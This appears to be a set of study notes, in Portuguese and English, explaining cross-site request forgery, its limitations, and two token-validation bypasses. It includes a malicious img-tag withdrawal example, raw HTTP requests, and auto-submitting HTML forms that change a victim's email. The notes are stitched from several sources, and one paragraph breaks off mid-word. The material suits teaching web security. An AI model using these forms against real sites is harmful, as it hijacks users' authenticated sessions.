<img src="https://periciacomputacional.com/wp-content/uploads/2018/10/csrf-banner-1280x640.png"/>  

# Como ocorre
O ataque funciona através da inclusão de um link ou script numa página que acede a um site no qual se sabe (ou se supõe) que o utilizador tenha sido autenticado.[5] Por exemplo, um usuário, Bob, pode estar a navegar num fórum de bate-papo onde outro usuário, Fred, postou uma mensagem. Suponha-se que Fred tenha criado um elemento da imagem HTML que faz referência a uma ação no site do banco de Bob (em vez de um arquivo de imagem), por exemplo,

<i> < img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=Fred" /> </i>

Se o banco de Bob mantém a sua informação de autenticação num cookie, e se o cookie não expirou, então a tentativa do browser de Bob de carregar a imagem irá submeter o formulário de levantamento com o seu cookie, assim, autorizando uma transação sem a aprovação de Bob. A falsificação de solicitação entre sites é um ataque do tipo Confused deputy contra um navegador Web. O deputy no exemplo do banco é o navegador Web de Bob que é confundido para fazer mau uso da autoridade de Bob na direção de Fred.

As seguintes características são comuns ao CSRF:

Envolvem sites que dependem de uma identificação do usuário
Exploram a confiança do site nessa identificação
Iludem o navegador do usuário para o envio de solicitações HTTP para um site de destino
Envolvem solicitações HTTP que têm efeitos colaterais
Os riscos são as aplicações Web que executam ações com base na confiança e autenticação das entradas dos usuários, sem exigir que o usuário autorize a ação específica. Um usuário que é autenticado por um cookie guardado no navegador web do usuário, sem saber, pode enviar um pedido HTTP a um site que confia no usuário e, assim, fazer uma ação indesejada.

Ataques CSRF em tags de imagem muitas vezes são feitas a partir de fóruns na Internet, onde os usuários têm permissão para postar imagens, mas não JavaScript.


https://www.treinaweb.com.br/blog/cross-site-request-forgery-csrf-e-abordagens-para-mitiga-lo/

<img src="https://www.infosec.com.br/wp-content/uploads/2017/07/cross-site-request-forgery.png" width="750"/>  

# Limitações
Várias coisas têm que acontecer para que um cross-site request forgery tenha sucesso:

<ul>
  <li> O atacante deve ter como alvo tanto um site que não verifica o campo Referer do cabeçalho HTTP (que é comum) ou uma vítima com um bug no navegador ou plug-in que permite alterar o campo Referer (o que é raro).</li>
  <li>O atacante deve encontrar uma submissão do formulário no local de destino, ou uma URL que tem efeitos colaterais, que faz algo (por exemplo, transferências de dinheiro, ou mudanças de endereço da vítima e-mail ou senha).</li>
  <li>O atacante deve determinar os valores corretos para todos os formulários ou entradas URL; se qualquer um deles são obrigados a serem os valores de autenticação secreta ou identificações que o atacante não pode adivinhar, o ataque irá falhar.</li>
  <li>O atacante deve atrair a vítima para uma página Web com código malicioso enquanto a vítima está conectada ao site de destino.</li>
</ul>
<br/>
Nota-se que o ataque é cego, ou seja, o invasor não pode ver o que o site-alvo envia de volta à vítima, em resposta aos pedidos forjados, a menos que ele explore um cross-site scripting ou outro bug no site do alvo. Da mesma forma, o atacante só pode ter como alvo algum link ou apresentar qualquer formulário que surge após o pedido inicial forjado, se essas relações subsequentes ou formulários são igualmente previsíveis. (Alvos múltiplos podem ser simulados, incluindo várias imagens em uma página, ou usando JavaScript para introduzir um atraso entre os cliques). Dadas essas limitações, um atacante pode ter dificuldade em encontrar registros das vítimas ou envios de formulários atacáveis. Por outro lado, as tentativas de ataque são fáceis de montar e invisíveis às vítimas, e projetistas de aplicações são menos familiarizados e preparados para ataques CSRF do que para, digamos, ataques de adivinhação de senha dicionari

# Validation of CSRF token depends on request method
Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:<br/>
```
  GET /email/change?email=pwned@evil-user.net HTTP/1.1<br/>
  Host: vulnerable-website.com<br/>
  Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm<br/>
```
 
 Exploit example:
 ``` html
  <form method="GET" action="https://vulnerablesite/email/change-email">
     <input type="hidden" name="csrf" value="1iOsHyPVwSb0j6eFXwmd4zen1qvYrhs2">
     <input type="email" name="email" value="atackers@email.com">
  </form>
  <script>
      document.forms[0].submit();
  </script>
```

# Validation of CSRF token depends on token being present
Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:<br/>
```
  POST /email/change HTTP/1.1<br/>
  Host: vulnerable-website.com<br/>
  Content-Type: application/x-www-form-urlencoded<br/>
  Content-Length: 25<br/>
  Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm<br/>

  email=pwned@evil-user.net<br/>
```
Exploit example:
 ```html
  <form method="POST" action="https://vulnerablesite/email/change-email">                    
    <input type="hidden" name="email" value="atacker@email">                    
  </form>
  <script>
    document.forms[0].submit();
  </script>
```
